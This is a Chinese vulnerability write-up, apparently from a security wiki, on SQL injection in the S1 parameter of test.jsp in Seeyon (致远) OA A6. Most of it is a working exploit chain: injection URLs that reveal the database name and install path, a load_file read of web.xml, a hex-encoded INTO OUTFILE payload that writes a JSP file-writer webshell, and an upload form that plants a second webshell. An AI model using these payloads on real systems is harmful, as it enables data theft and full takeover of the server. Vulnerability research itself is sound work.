致远OA A6 test.jsp sql注入漏洞
==============================

一、漏洞简介
------------

致远A6协同系统 `/yyoa/common/js/menu/test.jsp` 文件 S1 参数SQL注入漏洞

二、漏洞影响
------------

致远OA A6

三、复现过程
------------

注入点为S1变量，通过探测，发现是mysql数据库

    http://www.0-sec.org/yyoa/common/js/menu/test.jsp?doType=101&S1=

于是构造注入语句查询数据库名：

    http://www.0-sec.org/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20database())

![](/Users/aresx/Documents/VulWiki/.resource/致远OAA6test.jspsql注入漏洞/media/rId24.png)

Mysql注入中，我们使用into outfile
来写入数据，用此方法注入webshell，前提条件两个：

-   1：root权限

-   2：物理路径

我们探测一下web根目录

    http://www.0-sec.org/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir)

![](/Users/aresx/Documents/VulWiki/.resource/致远OAA6test.jspsql注入漏洞/media/rId25.png)

通过yyoa目录结构猜测物理路径为

    F:/UFseeyon/OA/tomcat/webapps/yyoa/

可以使用load\_file判断是否正确

    http://www.0-sec.org/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20load_file(%27F:/UFseeyon/OA/tomcat/webapps/yyoa/WEB-INF/web.xml%27)

利用mysql into
outfile写shell：由于jsp一句话超长，请求连接会拒绝，故先上传写文件脚本，再本地构造进行webshell上传：

    <%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\\")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%>

由于特殊符号存在，URL编码会造成写入后代码错误，故采用hex编码后unhex处理上传，写入文件名为：he1p.jsp

    http://www.0-sec.org/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27F:/UFseeyon/OA/tomcat/webapps/yyoa/he1p.jsp%27

本地构造上传：

    <html>
        <form action="http://www.0-sec.org/yyoa/he1p.jsp?f=we1come.jsp" method="post">
            <textarea name=t cols=120 rows=10 width=45>your code</testarea>
            <input type=submit value="提交">
        </form>
    </html>

上传后获取webshell地址为：<http://www.0-sec.org/yyoa/we1come.jsp>

参考链接
--------

> <https://www.pa55w0rd.online/yyoa/>
